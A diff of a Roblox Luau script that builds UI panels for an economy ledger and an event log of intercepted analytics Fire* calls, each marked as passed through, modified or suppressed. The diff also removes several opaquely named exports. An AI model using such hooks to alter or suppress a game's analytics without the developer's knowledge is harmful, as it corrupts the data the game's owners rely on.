+addCorner(ledgerScroll, UDim.new(0,8)); addStroke(ledgerScroll, 1, 0.4)
+mk("UIListLayout",{Padding=UDim.new(0,0),
+    SortOrder=Enum.SortOrder.LayoutOrder, Parent=ledgerScroll})
+
+local ledgerEmpty = mk("TextLabel",{BackgroundTransparency=1,
+    Font=Enum.Font.Gotham, Text="  No economy events observed yet.",
+    TextColor3=C.SUBTEXT, TextSize=11,
+    Size=UDim2.new(1,0,0,30), TextXAlignment=Enum.TextXAlignment.Left,
+    Parent=ledgerScroll})
+mk("UIPadding",{PaddingLeft=UDim.new(0,8),Parent=ledgerEmpty})
+
+local ledgerRowRefs = {}  -- [sku] = row Frame ref
+
+local function ASE_UpdateLedgerRow(sku, rec)
+    local isNew = ledgerRowRefs[sku] == nil
+    local net   = rec.totalSource - rec.totalSink
+    local netPos = net >= 0
+
+    if isNew then
+        local count = 0
+        for _ in pairs(ledgerRowRefs) do count = count + 1 end
+        local row = mk("Frame",{
+            BackgroundColor3 = count%2==0
+                and Color3.fromRGB(252,248,242)
+                or  Color3.fromRGB(246,240,232),
+            BorderSizePixel=0,
+            Size=UDim2.new(1,0,0,24), LayoutOrder=count+1, Parent=ledgerScroll})
+        mk("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal, Parent=row})
+        mk("UIPadding",{PaddingLeft=UDim.new(0,8),Parent=row})
+
+        local function cell(text, w, color, mono)
+            return mk("TextLabel",{BackgroundTransparency=1,
+                Font=mono and Enum.Font.GothamMono or Enum.Font.Gotham,
+                Text=text, TextColor3=color or C.TEXT, TextSize=10,
+                Size=UDim2.new(0,w,1,0),
+                TextXAlignment=Enum.TextXAlignment.Left, Parent=row})
+        end
+
+        cell(sku:sub(1,22), 160, C.TEXT, true)
+        cell(rec.currency:sub(1,10), 70, C.SUBTEXT, false)
+        local srcCell  = cell(tostring(rec.totalSource), 80, Color3.fromRGB(40,140,70), true)
+        local sinkCell = cell(tostring(rec.totalSink),   80, Color3.fromRGB(180,60,60), true)
+        local netCell  = cell((netPos and "+" or "") .. tostring(net), 70,
+            netPos and Color3.fromRGB(40,140,70) or Color3.fromRGB(180,60,60), true)
+        local cntCell  = cell(tostring(rec.count), 45, C.SUBTEXT, true)
+
+        ledgerRowRefs[sku] = {
+            row=row, srcCell=srcCell, sinkCell=sinkCell,
+            netCell=netCell, cntCell=cntCell
+        }
+    else
+        local refs = ledgerRowRefs[sku]
+        refs.srcCell.Text  = tostring(rec.totalSource)
+        refs.sinkCell.Text = tostring(rec.totalSink)
+        refs.netCell.Text  = (netPos and "+" or "") .. tostring(net)
+        refs.netCell.TextColor3 = netPos
+            and Color3.fromRGB(40,140,70) or Color3.fromRGB(180,60,60)
+        refs.cntCell.Text  = tostring(rec.count)
+    end
+
+    local itemCount = 0
+    for _ in pairs(ledgerRowRefs) do itemCount = itemCount + 1 end
+    ledgerCountLbl.Text = itemCount .. " item(s)"
+    ledgerEmpty.Visible = (itemCount == 0)
+end
+
+-- Wire ledger callbacks
+table.insert(ASE_LedgerCallbacks, function(sku, rec)
+    ASE_UpdateLedgerRow(sku, rec)
+end)
+
+btnLedgerClear.MouseButton1Click:Connect(function()
+    ASE.Ledger = {}
+    for _, refs in pairs(ledgerRowRefs) do
+        if refs.row and refs.row.Parent then refs.row:Destroy() end
+    end
+    ledgerRowRefs = {}
+    ledgerCountLbl.Text = "0 items"
+    ledgerEmpty.Visible = true
+    GSE_Log("ASE", "Economy ledger cleared")
+end)
+
+-- Restore ledger from session
+for sku, rec in pairs(ASE.Ledger) do
+    ASE_UpdateLedgerRow(sku, rec)
+end
+
+-- ============================================================
+-- UI — SECTION: Analytics Event Log
+-- ============================================================
+local _, sASELog = makeSection(pageGSE, "📋  Analytics Event Log")
+
+gseLabel(sASELog,
+    "Every intercepted Fire* call. Colour-coded by disposition:\n" ..
+    "green = passthrough,  blue = modified,  red = suppressed.",
+    11, false, C.SUBTEXT)
+
+local aseLogTopRow = gseRow(sASELog)
+local btnASEClear  = gseBtn(aseLogTopRow, "🗑 Clear", C.BTN, C.BTNHOV, 1)
+btnASEClear.Size   = UDim2.new(0,80,0,24)
+local aseLogCount  = gseLabel(aseLogTopRow, "0 events", 11, false, C.SUBTEXT)
+
+local aseLogScroll = mk("ScrollingFrame",{
+    BackgroundColor3=C.ASE_LOG,
+    BorderSizePixel=0, Size=UDim2.new(1,-16,0,200),
+    CanvasSize=UDim2.new(0,0,0,0), AutomaticCanvasSize=Enum.AutomaticSize.Y,
+    ScrollBarThickness=5, ScrollingDirection=Enum.ScrollingDirection.Y,
+    Parent=sASELog,
+})
+addCorner(aseLogScroll, UDim.new(0,8))
+mk("UIListLayout",{Padding=UDim.new(0,2),
+    SortOrder=Enum.SortOrder.LayoutOrder, Parent=aseLogScroll})
+mk("UIPadding",{PaddingLeft=UDim.new(0,8),PaddingTop=UDim.new(0,6),
+    PaddingBottom=UDim.new(0,6),PaddingRight=UDim.new(0,6),Parent=aseLogScroll})
+
+local aseLogRows  = {}
+local aseLogOrder = 0
+
+local function ASE_AddEventRow(entry)
+    aseLogOrder = aseLogOrder + 1
+    local row = mk("Frame",{BackgroundTransparency=1,
+        Size=UDim2.new(1,0,0,0), AutomaticSize=Enum.AutomaticSize.Y,
+        LayoutOrder=aseLogOrder, Parent=aseLogScroll})
+    mk("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal,
+        VerticalAlignment=Enum.VerticalAlignment.Top,
+        Padding=UDim.new(0,5), Parent=row})
+
+    -- Time
+    mk("TextLabel",{BackgroundTransparency=1, Font=Enum.Font.GothamMono,
+        Text=string.format("[%.1f]", entry.time),
+        TextColor3=Color3.fromRGB(90,90,90), TextSize=9,
+        Size=UDim2.new(0,46,0,16),
+        TextXAlignment=Enum.TextXAlignment.Left, Parent=row})
+
+    -- Disposition badge
+    local dispColor = entry.suppressed
+        and Color3.fromRGB(200,70,70)
+        or (entry.modified
+            and Color3.fromRGB(70,130,200)
+            or  Color3.fromRGB(70,170,90))
+    local dispText = entry.suppressed and "SUPP"
+        or (entry.modified and "MOD" or "PASS")
+    local dispBadge = mk("TextLabel",{
+        BackgroundColor3=dispColor, BorderSizePixel=0,
+        Font=Enum.Font.GothamBold, Text=dispText,
+        TextColor3=Color3.fromRGB(255,255,255), TextSize=8,
+        Size=UDim2.new(0,36,0,14),
+        TextXAlignment=Enum.TextXAlignment.Center, Parent=row,
+    })
+    addCorner(dispBadge, UDim.new(0,4))
+
+    -- Method badge
+    local methodShort = entry.method
+        :gsub("Fire",""):gsub("Event",""):sub(1,10)
+    local methodBadge = mk("TextLabel",{
+        BackgroundColor3=Color3.fromRGB(50,45,40), BorderSizePixel=0,
+        Font=Enum.Font.GothamMono, Text=methodShort,
+        TextColor3=Color3.fromRGB(200,190,170), TextSize=8,
+        AutomaticSize=Enum.AutomaticSize.X, Size=UDim2.new(0,0,0,14),
+        TextXAlignment=Enum.TextXAlignment.Center, Parent=row,
+    })
+    addCorner(methodBadge, UDim.new(0,4))
+    mk("UIPadding",{PaddingLeft=UDim.new(0,4),PaddingRight=UDim.new(0,4),
+        Parent=methodBadge})
+
+    -- Args summary
+    local argStrs = {}
+    for i, v in ipairs(entry.args) do
+        if i > 1 then  -- skip player arg
+            argStrs[#argStrs+1] = tostring(v):sub(1,20)
+        end
+        if #argStrs >= 4 then argStrs[#argStrs+1] = "..."; break end
+    end
+    mk("TextLabel",{BackgroundTransparency=1, Font=Enum.Font.GothamMono,
+        Text=table.concat(argStrs, "  |  "),
+        TextColor3=Color3.fromRGB(170,200,170), TextSize=9,
+        AutomaticSize=Enum.AutomaticSize.XY, Size=UDim2.new(0,0,0,0),
+        TextXAlignment=Enum.TextXAlignment.Left,
+        TextWrapped=true, Parent=row})
+
+    table.insert(aseLogRows, row)
+    if #aseLogRows > 100 then
+        local old = table.remove(aseLogRows, 1)
+        if old and old.Parent then old:Destroy() end
+    end
+
+    aseLogCount.Text = #ASE.Events .. " event(s)"
+end
+
+-- Wire event callbacks to UI
+table.insert(ASE_EventCallbacks, function(entry)
+    ASE_AddEventRow(entry)
+end)
+
+btnASEClear.MouseButton1Click:Connect(function()
+    ASE.Events = {}
+    for _, r in ipairs(aseLogRows) do
+        if r and r.Parent then r:Destroy() end
+    end
+    aseLogRows = {}; aseLogOrder = 0
+    aseLogCount.Text = "0 events"
+end)
+
+-- Restore event log from session
+for i = #ASE.Events, 1, -1 do ASE_AddEventRow(ASE.Events[i]) end
+
+-- ============================================================
+-- EXPORT ASE
+-- ============================================================
 _G.PC.ASE = ASE
-_G.PC.ASE_BedrockHandshake  = ASE_BedrockHandshake
-_G.PC.ASE_DirectiveCompiler = ASE_DirectiveCompiler
-_G.PC.ASE_ForgeEngine       = ASE_ForgeEngine
-_G.PC.ASE_RecompileEngine   = ASE_RecompileEngine
-_G.PC.ASE_VerifyCircuit     = ASE_VerifyCircuit
-_G.PC.ASE_LingerWatch       = ASE_LingerWatch
-_G.PC.ASE_PropertySteerer   = ASE_PropertySteerer
-_G.PC.ASE_StateNudge           = ASE_StateNudge
-_G.PC.ASE_AntecedentExtractor  = ASE_AntecedentExtractor
-_G.PC.ASE_TwoStageSequencer    = ASE_TwoStageSequencer
-print("[ASE] Module registered.")
+
+-- EXPORT ASE
+_G.PC.ASE = ASE
